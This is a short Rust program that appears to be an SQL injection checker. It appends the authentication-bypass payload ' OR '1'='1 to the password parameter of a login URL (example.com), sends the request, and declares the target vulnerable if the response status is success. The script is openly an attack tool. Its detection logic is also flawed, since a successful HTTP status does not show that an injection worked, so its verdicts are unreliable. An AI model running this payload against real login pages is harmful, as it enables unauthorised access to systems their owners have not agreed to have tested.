extern crate reqwest;

fn is_vulnerable(url: &str) -> bool {
    let payload = "' OR '1'='1";
    let full_url = format!("{}{}", url, payload);
    let response = reqwest::blocking::get(&full_url).unwrap();
    response.status().is_success()
}

fn main() {
    let target_url = "http://example.com/login?username=admin&password=";
    if is_vulnerable(target_url) {
        println!("The target is vulnerable to SQL injection.");
    } else {
        println!("The target is not vulnerable to SQL injection.");
    }
}
